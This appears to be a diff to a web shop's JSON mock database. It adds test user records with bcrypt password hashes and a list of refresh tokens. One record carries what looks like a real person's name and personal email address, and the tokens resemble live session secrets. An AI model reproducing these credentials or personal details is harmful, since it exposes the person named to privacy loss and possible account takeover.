+      "role": "user"
+    },
+    {
+      "id": "df45ffe5-34ff-4acf-88fd-28210851c068",
+      "name": "testuser12355",
+      "email": "test@test12345.com",
+      "password": "$2a$10$g6/E.E/JwlI1SpLMLuQ6feTlejCxY3fKCov8l8GMCYMfI78.xDpzi",
+      "role": "user"
+    },
+    {
+      "id": "d2a2480a-ea0d-4bc0-bf27-8a4eb7cf8723",
+      "name": "testuser111",
+      "email": "test@test1111.com",
+      "password": "$2a$10$Oy0Lz/U1YCa0rP9Rv81bceoMwKKGSOipPf3iYndcDVSvjn.LXlkvC",
+      "role": "user"
+    },
+    {
+      "id": "50293f64-5384-434a-97aa-50f8913b2ec5",
+      "name": "testuserc",
+      "email": "test@testc.com",
+      "password": "$2a$10$ewgbNAiXmlI.H/NV6PI8qO9g2t7rqQP1wpvkQKWg5xSF6dCqPn.e6",
+      "role": "user"
+    },
+    {
+      "id": "92f1a1b9-f38d-4cf1-aeb1-d55df2c5f6dd",
+      "name": "trần minh chien",
+      "email": "chien190203@gmail.com",
+      "password": "$2a$10$7e76rQPWkkeURcBKT6SsBuGVVLTf2L/QynxXsbal2rd3epMsISBz6",
+      "role": "user"
+    },
+    {
+      "id": "d3967b51-99b8-4561-91ac-e202eba0c900",
+      "name": "test_user_1872738036",
+      "email": "test_450661913@test.com",
+      "password": "$2a$10$aVpNWSMvAybgel0VeCXm5el4U0BVmGBfN25DEr6Rzq/hWxc4ZZoxy",
+      "role": "user"
     }
   ],
   "carts": [],
-  "orders": []
+  "orders": [],
+  "refreshTokens": [
+    {
+      "token": "6c780e0da7ea243504ea0e183be26bdb3712c444f5f6755f1d90a882b73661779d79372932d25bb6",
+      "userId": "1",
+      "expiresAt": 1783426063987
+    },
+    {
+      "token": "d4663e80c147915e16c44f20b681cebbf03f214926e429e5961c3a81f16d1e0fc097888f4ab92f3b",
+      "userId": "1",
+      "expiresAt": 1783426310844
+    },
+    {
+      "token": "e1b6ff4f3425f81a30172cc96e269d15f048831038d90f0e4c3815914e3ac4a8fba7b6ae28cec208",
+      "userId": "1",
+      "expiresAt": 1783426658861
+    },
+    {
+      "token": "a47df3814b26a8e2f78d3c0168832c0036400164533c4a434f39660ca3b9c249b5f606d04ccab971",
+      "userId": "d3967b51-99b8-4561-91ac-e202eba0c900",
+      "expiresAt": 1783426813401
+    }
+  ]
 }
